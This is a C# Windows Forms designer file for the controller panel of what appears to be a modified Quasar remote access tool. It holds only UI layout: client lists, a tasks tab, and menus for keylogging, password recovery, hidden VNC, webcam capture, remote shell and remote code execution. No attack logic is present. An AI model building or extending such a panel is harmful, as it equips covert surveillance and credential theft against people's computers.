		this.registryEditorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.remoteExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.localFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.webFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.nETCodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ctxtLine = new System.Windows.Forms.ToolStripSeparator();
		this.actionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.shutdownToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.standbyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.surveillanceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.passwordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.keyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.remoteDesktopToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.webcamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.hVNCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.userSupportToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.showMessageboxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.visitWebsiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.connectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.updateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.reconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.removeOfflineClientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.uninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.lineToolStripMenuItem = new System.Windows.Forms.ToolStripSeparator();
		this.selectAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.imgFlags = new System.Windows.Forms.ImageList(this.components);
		this.notifyIcon = new System.Windows.Forms.NotifyIcon(this.components);
		this.label1 = new System.Windows.Forms.Label();
		this.gBoxClientInfo = new System.Windows.Forms.GroupBox();
		this.listView1 = new Quasar.Server.Controls.AeroListView();
		this.Names = new System.Windows.Forms.ColumnHeader();
		this.Stats = new System.Windows.Forms.ColumnHeader();
		this.pictureBoxMain = new System.Windows.Forms.PictureBox();
		this.guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
		this.guna2CirclePictureBox1 = new Guna.UI2.WinForms.Guna2CirclePictureBox();
		this.label2 = new System.Windows.Forms.Label();
		this.listenToolStripStatusLabel = new System.Windows.Forms.Label();
		this.guna2Button2 = new Guna.UI2.WinForms.Guna2Button();
		this.guna2Button3 = new Guna.UI2.WinForms.Guna2Button();
		this.guna2Button4 = new Guna.UI2.WinForms.Guna2Button();
		this.guna2Button5 = new Guna.UI2.WinForms.Guna2Button();
		this.lstClients = new Quasar.Server.Controls.AeroListView();
		this.hIP = new System.Windows.Forms.ColumnHeader();
		this.hTag = new System.Windows.Forms.ColumnHeader();
		this.hUserPC = new System.Windows.Forms.ColumnHeader();
		this.hVersion = new System.Windows.Forms.ColumnHeader();
		this.hStatus = new System.Windows.Forms.ColumnHeader();
		this.hUserStatus = new System.Windows.Forms.ColumnHeader();
		this.hCountry = new System.Windows.Forms.ColumnHeader();
		this.hOS = new System.Windows.Forms.ColumnHeader();
		this.hAccountType = new System.Windows.Forms.ColumnHeader();
		this.contextMenuStrip.SuspendLayout();
		this.gBoxClientInfo.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.pictureBoxMain).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.guna2CirclePictureBox1).BeginInit();
		base.SuspendLayout();
		this.contextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.systemToolStripMenuItem, this.surveillanceToolStripMenuItem, this.userSupportToolStripMenuItem, this.connectionToolStripMenuItem, this.lineToolStripMenuItem, this.selectAllToolStripMenuItem });
		this.contextMenuStrip.Name = "ctxtMenu";
		this.contextMenuStrip.Size = new System.Drawing.Size(180, 120);
		this.contextMenuStrip.Opening += new System.ComponentModel.CancelEventHandler(contextMenuStrip_Opening);
		this.systemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[11]
		{
			this.systemInformationToolStripMenuItem, this.fileManagerToolStripMenuItem, this.startupManagerToolStripMenuItem, this.taskManagerToolStripMenuItem, this.remoteShellToolStripMenuItem, this.connectionsToolStripMenuItem, this.reverseProxyToolStripMenuItem, this.registryEditorToolStripMenuItem, this.remoteExecuteToolStripMenuItem, this.ctxtLine,
			this.actionsToolStripMenuItem
		});
		this.systemToolStripMenuItem.Image = Quasar.Server.Properties.Resources.cog;
		this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
		this.systemToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
		this.systemToolStripMenuItem.Text = "Administration";
		this.systemInformationToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("systemInformationToolStripMenuItem.Image");
		this.systemInformationToolStripMenuItem.Name = "systemInformationToolStripMenuItem";
		this.systemInformationToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.systemInformationToolStripMenuItem.Text = "System Information";
		this.systemInformationToolStripMenuItem.Click += new System.EventHandler(systemInformationToolStripMenuItem_Click);
		this.fileManagerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("fileManagerToolStripMenuItem.Image");
		this.fileManagerToolStripMenuItem.Name = "fileManagerToolStripMenuItem";
		this.fileManagerToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.fileManagerToolStripMenuItem.Text = "File Manager";
		this.fileManagerToolStripMenuItem.Click += new System.EventHandler(fileManagerToolStripMenuItem_Click);
		this.startupManagerToolStripMenuItem.Image = Quasar.Server.Properties.Resources.application_edit;
		this.startupManagerToolStripMenuItem.Name = "startupManagerToolStripMenuItem";
		this.startupManagerToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.startupManagerToolStripMenuItem.Text = "Startup Manager";
		this.startupManagerToolStripMenuItem.Click += new System.EventHandler(startupManagerToolStripMenuItem_Click);
		this.taskManagerToolStripMenuItem.Image = Quasar.Server.Properties.Resources.application_cascade;
		this.taskManagerToolStripMenuItem.Name = "taskManagerToolStripMenuItem";
		this.taskManagerToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.taskManagerToolStripMenuItem.Text = "Task Manager";
		this.taskManagerToolStripMenuItem.Click += new System.EventHandler(taskManagerToolStripMenuItem_Click);
		this.remoteShellToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("remoteShellToolStripMenuItem.Image");
		this.remoteShellToolStripMenuItem.Name = "remoteShellToolStripMenuItem";
		this.remoteShellToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.remoteShellToolStripMenuItem.Text = "Remote Shell";
		this.remoteShellToolStripMenuItem.Click += new System.EventHandler(remoteShellToolStripMenuItem_Click);
		this.connectionsToolStripMenuItem.Image = Quasar.Server.Properties.Resources.transmit_blue;
		this.connectionsToolStripMenuItem.Name = "connectionsToolStripMenuItem";
		this.connectionsToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.connectionsToolStripMenuItem.Text = "TCP Connections";
		this.connectionsToolStripMenuItem.Click += new System.EventHandler(connectionsToolStripMenuItem_Click);
		this.reverseProxyToolStripMenuItem.Image = Quasar.Server.Properties.Resources.server_link;
		this.reverseProxyToolStripMenuItem.Name = "reverseProxyToolStripMenuItem";
		this.reverseProxyToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.reverseProxyToolStripMenuItem.Text = "Reverse Proxy";
		this.reverseProxyToolStripMenuItem.Click += new System.EventHandler(reverseProxyToolStripMenuItem_Click);
		this.registryEditorToolStripMenuItem.Image = Quasar.Server.Properties.Resources.registry;
		this.registryEditorToolStripMenuItem.Name = "registryEditorToolStripMenuItem";
		this.registryEditorToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.registryEditorToolStripMenuItem.Text = "Registry Editor";
		this.registryEditorToolStripMenuItem.Click += new System.EventHandler(registryEditorToolStripMenuItem_Click);
		this.remoteExecuteToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.localFileToolStripMenuItem, this.webFileToolStripMenuItem, this.nETCodeToolStripMenuItem });
		this.remoteExecuteToolStripMenuItem.Image = Quasar.Server.Properties.Resources.lightning;
		this.remoteExecuteToolStripMenuItem.Name = "remoteExecuteToolStripMenuItem";
		this.remoteExecuteToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.remoteExecuteToolStripMenuItem.Text = "Remote Execute";
		this.localFileToolStripMenuItem.Image = Quasar.Server.Properties.Resources.drive_go;
		this.localFileToolStripMenuItem.Name = "localFileToolStripMenuItem";
		this.localFileToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.localFileToolStripMenuItem.Text = "Local File...";
		this.localFileToolStripMenuItem.Click += new System.EventHandler(localFileToolStripMenuItem_Click);
		this.webFileToolStripMenuItem.Image = Quasar.Server.Properties.Resources.world_go;
		this.webFileToolStripMenuItem.Name = "webFileToolStripMenuItem";
		this.webFileToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.webFileToolStripMenuItem.Text = "Web File...";
		this.webFileToolStripMenuItem.Click += new System.EventHandler(webFileToolStripMenuItem_Click);
		this.nETCodeToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("nETCodeToolStripMenuItem.Image");
		this.nETCodeToolStripMenuItem.Name = "nETCodeToolStripMenuItem";
		this.nETCodeToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.nETCodeToolStripMenuItem.Text = ".NET Code";
		this.ctxtLine.Name = "ctxtLine";
		this.ctxtLine.Size = new System.Drawing.Size(175, 6);
		this.actionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.shutdownToolStripMenuItem, this.restartToolStripMenuItem, this.standbyToolStripMenuItem });
		this.actionsToolStripMenuItem.Image = Quasar.Server.Properties.Resources.actions;
		this.actionsToolStripMenuItem.Name = "actionsToolStripMenuItem";
		this.actionsToolStripMenuItem.Size = new System.Drawing.Size(178, 22);
		this.actionsToolStripMenuItem.Text = "Actions";
		this.shutdownToolStripMenuItem.Image = Quasar.Server.Properties.Resources.shutdown;
		this.shutdownToolStripMenuItem.Name = "shutdownToolStripMenuItem";
		this.shutdownToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
		this.shutdownToolStripMenuItem.Text = "Shutdown";
		this.shutdownToolStripMenuItem.Click += new System.EventHandler(shutdownToolStripMenuItem_Click);
		this.restartToolStripMenuItem.Image = Quasar.Server.Properties.Resources.restart;
		this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
		this.restartToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
		this.restartToolStripMenuItem.Text = "Restart";
		this.restartToolStripMenuItem.Click += new System.EventHandler(restartToolStripMenuItem_Click);
		this.standbyToolStripMenuItem.Image = Quasar.Server.Properties.Resources.standby;
		this.standbyToolStripMenuItem.Name = "standbyToolStripMenuItem";
		this.standbyToolStripMenuItem.Size = new System.Drawing.Size(128, 22);
		this.standbyToolStripMenuItem.Text = "Standby";
		this.standbyToolStripMenuItem.Click += new System.EventHandler(standbyToolStripMenuItem_Click);
		this.surveillanceToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.passwordRecoveryToolStripMenuItem, this.keyloggerToolStripMenuItem, this.remoteDesktopToolStripMenuItem2, this.webcamToolStripMenuItem, this.hVNCToolStripMenuItem });
		this.surveillanceToolStripMenuItem.Image = Quasar.Server.Properties.Resources.monitoring;
		this.surveillanceToolStripMenuItem.Name = "surveillanceToolStripMenuItem";
		this.surveillanceToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
		this.surveillanceToolStripMenuItem.Text = "Monitoring";
		this.passwordRecoveryToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("passwordRecoveryToolStripMenuItem.Image");
		this.passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
		this.passwordRecoveryToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.passwordRecoveryToolStripMenuItem.Text = "Password Recovery";
		this.passwordRecoveryToolStripMenuItem.Click += new System.EventHandler(passwordRecoveryToolStripMenuItem_Click);
		this.keyloggerToolStripMenuItem.Image = Quasar.Server.Properties.Resources.keyboard_magnify;
		this.keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
		this.keyloggerToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.keyloggerToolStripMenuItem.Text = "Keylogger";
		this.keyloggerToolStripMenuItem.Click += new System.EventHandler(keyloggerToolStripMenuItem_Click);
		this.remoteDesktopToolStripMenuItem2.Image = Quasar.Server.Properties.Resources.monitor;
		this.remoteDesktopToolStripMenuItem2.Name = "remoteDesktopToolStripMenuItem2";
		this.remoteDesktopToolStripMenuItem2.Size = new System.Drawing.Size(175, 22);
		this.remoteDesktopToolStripMenuItem2.Text = "Remote Desktop";
		this.remoteDesktopToolStripMenuItem2.Click += new System.EventHandler(remoteDesktopToolStripMenuItem_Click);
		this.webcamToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("webcamToolStripMenuItem.Image");
		this.webcamToolStripMenuItem.Name = "webcamToolStripMenuItem";
		this.webcamToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.webcamToolStripMenuItem.Text = "Remote Webcam";
		this.webcamToolStripMenuItem.Click += new System.EventHandler(webcamToolStripMenuItem_Click);
		this.hVNCToolStripMenuItem.Image = Quasar.Server.Properties.Resources.monitor;
		this.hVNCToolStripMenuItem.Name = "hVNCToolStripMenuItem";
		this.hVNCToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.hVNCToolStripMenuItem.Text = "HVNC";
		this.hVNCToolStripMenuItem.Click += new System.EventHandler(hVNCToolStripMenuItem_Click);
		this.userSupportToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.showMessageboxToolStripMenuItem, this.visitWebsiteToolStripMenuItem });
		this.userSupportToolStripMenuItem.Image = Quasar.Server.Properties.Resources.user;
		this.userSupportToolStripMenuItem.Name = "userSupportToolStripMenuItem";
		this.userSupportToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
		this.userSupportToolStripMenuItem.Text = "User Interaction";
		this.showMessageboxToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("showMessageboxToolStripMenuItem.Image");
		this.showMessageboxToolStripMenuItem.Name = "showMessageboxToolStripMenuItem";
		this.showMessageboxToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.showMessageboxToolStripMenuItem.Text = "Show Messagebox";
		this.showMessageboxToolStripMenuItem.Click += new System.EventHandler(showMessageboxToolStripMenuItem_Click);
		this.visitWebsiteToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("visitWebsiteToolStripMenuItem.Image");
		this.visitWebsiteToolStripMenuItem.Name = "visitWebsiteToolStripMenuItem";
		this.visitWebsiteToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.visitWebsiteToolStripMenuItem.Text = "Send to Website";
		this.visitWebsiteToolStripMenuItem.Click += new System.EventHandler(visitWebsiteToolStripMenuItem_Click);
		this.connectionToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.updateToolStripMenuItem, this.reconnectToolStripMenuItem, this.removeOfflineClientToolStripMenuItem, this.uninstallToolStripMenuItem });
		this.connectionToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("connectionToolStripMenuItem.Image");
		this.connectionToolStripMenuItem.Name = "connectionToolStripMenuItem";
		this.connectionToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
		this.connectionToolStripMenuItem.Text = "Client Management";
		this.updateToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("updateToolStripMenuItem.Image");
		this.updateToolStripMenuItem.Name = "updateToolStripMenuItem";
		this.updateToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.updateToolStripMenuItem.Text = "Update";
		this.updateToolStripMenuItem.Click += new System.EventHandler(updateToolStripMenuItem_Click);
		this.reconnectToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("reconnectToolStripMenuItem.Image");
		this.reconnectToolStripMenuItem.Name = "reconnectToolStripMenuItem";
		this.reconnectToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.reconnectToolStripMenuItem.Text = "Reconnect";
		this.reconnectToolStripMenuItem.Click += new System.EventHandler(reconnectToolStripMenuItem_Click);
		this.removeOfflineClientToolStripMenuItem.Image = Quasar.Server.Properties.Resources.cancel;
		this.removeOfflineClientToolStripMenuItem.Name = "removeOfflineClientToolStripMenuItem";
		this.removeOfflineClientToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.removeOfflineClientToolStripMenuItem.Text = "Remove Offline Client";
		this.removeOfflineClientToolStripMenuItem.Click += new System.EventHandler(removeOfflineClientToolStripMenuItem_Click);
		this.uninstallToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("uninstallToolStripMenuItem.Image");
		this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
		this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.uninstallToolStripMenuItem.Text = "Uninstall";
		this.uninstallToolStripMenuItem.Click += new System.EventHandler(uninstallToolStripMenuItem_Click);
		this.lineToolStripMenuItem.Name = "lineToolStripMenuItem";
		this.lineToolStripMenuItem.Size = new System.Drawing.Size(176, 6);
		this.selectAllToolStripMenuItem.Name = "selectAllToolStripMenuItem";
		this.selectAllToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
		this.selectAllToolStripMenuItem.Text = "Select All";
		this.selectAllToolStripMenuItem.Click += new System.EventHandler(selectAllToolStripMenuItem_Click);
		this.imgFlags.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imgFlags.ImageStream");
		this.imgFlags.TransparentColor = System.Drawing.Color.Transparent;
        this.tabControl1 = new TabControl();
        this.tabPageClients = new TabPage();
        this.tabPageTasks = new TabPage();
        this.lstTasks = new ListView();
        this.btnAddTask = new Button();
        this.btnEditTask = new Button();
        this.btnDeleteTask = new Button();
        this.btnToggleTask = new Button();

        // TabControl
        this.tabControl1.Controls.Add(this.tabPageClients);
        this.tabControl1.Controls.Add(this.tabPageTasks);
        this.tabControl1.Location = new Point(243, 0);
        this.tabControl1.Name = "tabControl1";
        this.tabControl1.SelectedIndex = 0;
        this.tabControl1.Size = new Size(973, 496);
        this.tabControl1.TabIndex = 41;
        this.tabControl1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;

        // Clients Tab
        this.tabPageClients.Controls.Add(this.lstClients);
        this.tabPageClients.Location = new Point(4, 24);
        this.tabPageClients.Name = "tabPageClients";
        this.tabPageClients.Padding = new Padding(3);
        this.tabPageClients.Size = new Size(965, 468);
        this.tabPageClients.TabIndex = 0;
        this.tabPageClients.Text = "Clients";
        this.tabPageClients.BackColor = Color.FromArgb(25, 25, 25);

        // Move lstClients
        this.lstClients.Dock = DockStyle.Fill;

        // Tasks Tab
        this.tabPageTasks.Controls.Add(this.lstTasks);
        this.tabPageTasks.Controls.Add(this.btnAddTask);
        this.tabPageTasks.Controls.Add(this.btnEditTask);
        this.tabPageTasks.Controls.Add(this.btnDeleteTask);
        this.tabPageTasks.Controls.Add(this.btnToggleTask);
        this.tabPageTasks.Location = new Point(4, 24);
        this.tabPageTasks.Name = "tabPageTasks";
        this.tabPageTasks.Size = new Size(965, 468);
        this.tabPageTasks.TabIndex = 1;
        this.tabPageTasks.Text = "Tasks";
        this.tabPageTasks.BackColor = Color.FromArgb(25, 25, 25);

        // lstTasks
        this.lstTasks.BackColor = Color.FromArgb(30, 30, 30);
        this.lstTasks.ForeColor = Color.White;
        this.lstTasks.FullRowSelect = true;
        this.lstTasks.GridLines = true;
        this.lstTasks.Location = new Point(6, 6);
        this.lstTasks.Name = "lstTasks";
        this.lstTasks.Size = new Size(850, 456);
        this.lstTasks.TabIndex = 0;
        this.lstTasks.View = View.Details;
        this.lstTasks.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
        this.lstTasks.Columns.Add("✓", 40);
        this.lstTasks.Columns.Add("Task Name", 180);
        this.lstTasks.Columns.Add("Action", 120);
        this.lstTasks.Columns.Add("Details", 280);
        this.lstTasks.Columns.Add("Condition", 120);
        this.lstTasks.Columns.Add("Value", 110);

        // Buttons (btnAddTask, btnEditTask, btnDeleteTask, btnToggleTask)
        this.btnAddTask.BackColor = Color.FromArgb(60, 60, 60);
        this.btnAddTask.ForeColor = Color.White;
        this.btnAddTask.FlatStyle = FlatStyle.Flat;
        this.btnAddTask.Location = new Point(862, 6);
        this.btnAddTask.Size = new Size(97, 35);
        this.btnAddTask.Text = "Add Task";
        this.btnAddTask.Anchor = AnchorStyles.Top | AnchorStyles.Right;
        this.btnAddTask.Click += btnAddTask_Click;

        this.btnEditTask.BackColor = Color.FromArgb(60, 60, 60);
        this.btnEditTask.ForeColor = Color.White;
        this.btnEditTask.FlatStyle = FlatStyle.Flat;
        this.btnEditTask.Location = new Point(862, 47);
        this.btnEditTask.Size = new Size(97, 35);
        this.btnEditTask.Text = "Edit Task";
        this.btnEditTask.Anchor = AnchorStyles.Top | AnchorStyles.Right;
        this.btnEditTask.Click += btnEditTask_Click;

        this.btnDeleteTask.BackColor = Color.FromArgb(60, 60, 60);
        this.btnDeleteTask.ForeColor = Color.White;
        this.btnDeleteTask.FlatStyle = FlatStyle.Flat;
        this.btnDeleteTask.Location = new Point(862, 88);
        this.btnDeleteTask.Size = new Size(97, 35);
        this.btnDeleteTask.Text = "Delete Task";
        this.btnDeleteTask.Anchor = AnchorStyles.Top | AnchorStyles.Right;
        this.btnDeleteTask.Click += btnDeleteTask_Click;

        this.btnToggleTask.BackColor = Color.FromArgb(60, 60, 60);
        this.btnToggleTask.ForeColor = Color.White;
        this.btnToggleTask.FlatStyle = FlatStyle.Flat;
        this.btnToggleTask.Location = new Point(862, 129);
        this.btnToggleTask.Size = new Size(97, 35);
        this.btnToggleTask.Text = "Enable/Disable";
        this.btnToggleTask.Anchor = AnchorStyles.Top | AnchorStyles.Right;
        this.btnToggleTask.Click += btnToggleTask_Click;

        // Add TabControl to form
        this.Controls.Add(this.tabControl1);

        this.imgFlags.Images.SetKeyName(0, "ad.png");
		this.imgFlags.Images.SetKeyName(1, "ae.png");
		this.imgFlags.Images.SetKeyName(2, "af.png");
		this.imgFlags.Images.SetKeyName(3, "ag.png");
		this.imgFlags.Images.SetKeyName(4, "ai.png");
		this.imgFlags.Images.SetKeyName(5, "al.png");
		this.imgFlags.Images.SetKeyName(6, "am.png");
		this.imgFlags.Images.SetKeyName(7, "an.png");
		this.imgFlags.Images.SetKeyName(8, "ao.png");
		this.imgFlags.Images.SetKeyName(9, "ar.png");
		this.imgFlags.Images.SetKeyName(10, "as.png");
		this.imgFlags.Images.SetKeyName(11, "at.png");
		this.imgFlags.Images.SetKeyName(12, "au.png");
		this.imgFlags.Images.SetKeyName(13, "aw.png");
		this.imgFlags.Images.SetKeyName(14, "ax.png");
		this.imgFlags.Images.SetKeyName(15, "az.png");
		this.imgFlags.Images.SetKeyName(16, "ba.png");
		this.imgFlags.Images.SetKeyName(17, "bb.png");
		this.imgFlags.Images.SetKeyName(18, "bd.png");
		this.imgFlags.Images.SetKeyName(19, "be.png");
		this.imgFlags.Images.SetKeyName(20, "bf.png");
		this.imgFlags.Images.SetKeyName(21, "bg.png");
		this.imgFlags.Images.SetKeyName(22, "bh.png");
		this.imgFlags.Images.SetKeyName(23, "bi.png");
		this.imgFlags.Images.SetKeyName(24, "bj.png");
		this.imgFlags.Images.SetKeyName(25, "bm.png");
		this.imgFlags.Images.SetKeyName(26, "bn.png");
		this.imgFlags.Images.SetKeyName(27, "bo.png");
		this.imgFlags.Images.SetKeyName(28, "br.png");
		this.imgFlags.Images.SetKeyName(29, "bs.png");
		this.imgFlags.Images.SetKeyName(30, "bt.png");
		this.imgFlags.Images.SetKeyName(31, "bv.png");
		this.imgFlags.Images.SetKeyName(32, "bw.png");
		this.imgFlags.Images.SetKeyName(33, "by.png");
		this.imgFlags.Images.SetKeyName(34, "bz.png");
		this.imgFlags.Images.SetKeyName(35, "ca.png");
		this.imgFlags.Images.SetKeyName(36, "catalonia.png");
		this.imgFlags.Images.SetKeyName(37, "cc.png");
		this.imgFlags.Images.SetKeyName(38, "cd.png");
		this.imgFlags.Images.SetKeyName(39, "cf.png");
		this.imgFlags.Images.SetKeyName(40, "cg.png");
		this.imgFlags.Images.SetKeyName(41, "ch.png");
		this.imgFlags.Images.SetKeyName(42, "ci.png");
		this.imgFlags.Images.SetKeyName(43, "ck.png");
		this.imgFlags.Images.SetKeyName(44, "cl.png");
		this.imgFlags.Images.SetKeyName(45, "cm.png");
		this.imgFlags.Images.SetKeyName(46, "cn.png");
		this.imgFlags.Images.SetKeyName(47, "co.png");
		this.imgFlags.Images.SetKeyName(48, "cr.png");
		this.imgFlags.Images.SetKeyName(49, "cs.png");
		this.imgFlags.Images.SetKeyName(50, "cu.png");
		this.imgFlags.Images.SetKeyName(51, "cv.png");
		this.imgFlags.Images.SetKeyName(52, "cx.png");
		this.imgFlags.Images.SetKeyName(53, "cy.png");
		this.imgFlags.Images.SetKeyName(54, "cz.png");
		this.imgFlags.Images.SetKeyName(55, "de.png");
		this.imgFlags.Images.SetKeyName(56, "dj.png");
		this.imgFlags.Images.SetKeyName(57, "dk.png");
		this.imgFlags.Images.SetKeyName(58, "dm.png");
		this.imgFlags.Images.SetKeyName(59, "do.png");
		this.imgFlags.Images.SetKeyName(60, "dz.png");
		this.imgFlags.Images.SetKeyName(61, "ec.png");
		this.imgFlags.Images.SetKeyName(62, "ee.png");
		this.imgFlags.Images.SetKeyName(63, "eg.png");
		this.imgFlags.Images.SetKeyName(64, "eh.png");
		this.imgFlags.Images.SetKeyName(65, "england.png");
		this.imgFlags.Images.SetKeyName(66, "er.png");
		this.imgFlags.Images.SetKeyName(67, "es.png");
		this.imgFlags.Images.SetKeyName(68, "et.png");
		this.imgFlags.Images.SetKeyName(69, "europeanunion.png");
		this.imgFlags.Images.SetKeyName(70, "fam.png");
		this.imgFlags.Images.SetKeyName(71, "fi.png");
		this.imgFlags.Images.SetKeyName(72, "fj.png");
		this.imgFlags.Images.SetKeyName(73, "fk.png");
		this.imgFlags.Images.SetKeyName(74, "fm.png");
		this.imgFlags.Images.SetKeyName(75, "fo.png");
		this.imgFlags.Images.SetKeyName(76, "fr.png");
		this.imgFlags.Images.SetKeyName(77, "ga.png");
		this.imgFlags.Images.SetKeyName(78, "gb.png");
		this.imgFlags.Images.SetKeyName(79, "gd.png");
		this.imgFlags.Images.SetKeyName(80, "ge.png");
		this.imgFlags.Images.SetKeyName(81, "gf.png");
		this.imgFlags.Images.SetKeyName(82, "gh.png");
		this.imgFlags.Images.SetKeyName(83, "gi.png");
		this.imgFlags.Images.SetKeyName(84, "gl.png");
		this.imgFlags.Images.SetKeyName(85, "gm.png");
		this.imgFlags.Images.SetKeyName(86, "gn.png");
		this.imgFlags.Images.SetKeyName(87, "gp.png");
		this.imgFlags.Images.SetKeyName(88, "gq.png");
		this.imgFlags.Images.SetKeyName(89, "gr.png");
		this.imgFlags.Images.SetKeyName(90, "gs.png");
		this.imgFlags.Images.SetKeyName(91, "gt.png");
		this.imgFlags.Images.SetKeyName(92, "gu.png");
		this.imgFlags.Images.SetKeyName(93, "gw.png");
		this.imgFlags.Images.SetKeyName(94, "gy.png");
		this.imgFlags.Images.SetKeyName(95, "hk.png");
		this.imgFlags.Images.SetKeyName(96, "hm.png");
		this.imgFlags.Images.SetKeyName(97, "hn.png");
		this.imgFlags.Images.SetKeyName(98, "hr.png");
		this.imgFlags.Images.SetKeyName(99, "ht.png");
		this.imgFlags.Images.SetKeyName(100, "hu.png");
		this.imgFlags.Images.SetKeyName(101, "id.png");
		this.imgFlags.Images.SetKeyName(102, "ie.png");
		this.imgFlags.Images.SetKeyName(103, "il.png");
		this.imgFlags.Images.SetKeyName(104, "in.png");
		this.imgFlags.Images.SetKeyName(105, "io.png");
		this.imgFlags.Images.SetKeyName(106, "iq.png");
		this.imgFlags.Images.SetKeyName(107, "ir.png");
		this.imgFlags.Images.SetKeyName(108, "is.png");
		this.imgFlags.Images.SetKeyName(109, "it.png");
		this.imgFlags.Images.SetKeyName(110, "jm.png");
		this.imgFlags.Images.SetKeyName(111, "jo.png");
		this.imgFlags.Images.SetKeyName(112, "jp.png");
		this.imgFlags.Images.SetKeyName(113, "ke.png");
		this.imgFlags.Images.SetKeyName(114, "kg.png");
		this.imgFlags.Images.SetKeyName(115, "kh.png");
		this.imgFlags.Images.SetKeyName(116, "ki.png");
		this.imgFlags.Images.SetKeyName(117, "km.png");
		this.imgFlags.Images.SetKeyName(118, "kn.png");
		this.imgFlags.Images.SetKeyName(119, "kp.png");
		this.imgFlags.Images.SetKeyName(120, "kr.png");
		this.imgFlags.Images.SetKeyName(121, "kw.png");
		this.imgFlags.Images.SetKeyName(122, "ky.png");
		this.imgFlags.Images.SetKeyName(123, "kz.png");
		this.imgFlags.Images.SetKeyName(124, "la.png");
		this.imgFlags.Images.SetKeyName(125, "lb.png");
		this.imgFlags.Images.SetKeyName(126, "lc.png");
		this.imgFlags.Images.SetKeyName(127, "li.png");
